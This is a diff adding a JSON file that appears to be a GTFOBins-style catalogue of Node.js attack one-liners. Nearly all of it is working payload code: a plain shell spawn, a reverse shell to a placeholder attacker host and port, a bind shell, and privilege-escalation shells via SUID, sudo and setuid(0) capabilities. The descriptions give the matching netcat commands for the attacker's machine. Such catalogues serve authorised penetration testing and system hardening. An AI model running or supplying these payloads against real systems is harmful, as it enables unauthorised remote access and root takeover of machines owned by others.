@@ -1,0 +1,36 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'\n"
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "Run 'nc -l -p [port]' on the attacker box to receive the shell.",
+        "code": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nnet.connect([port], \"[host]\", function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n});'\n"
+      }
+    ],
+    "bind-shell": [
+      {
+        "description": "Run 'nc [host] [port]' on the attacker box to connect to the shell.",
+        "code": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen([port]);'\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]});'\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'\n"
+      }
+    ],
+    "capabilities": [
+      {
+        "code": "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'\n"
+      }
+    ]
+  }
+}
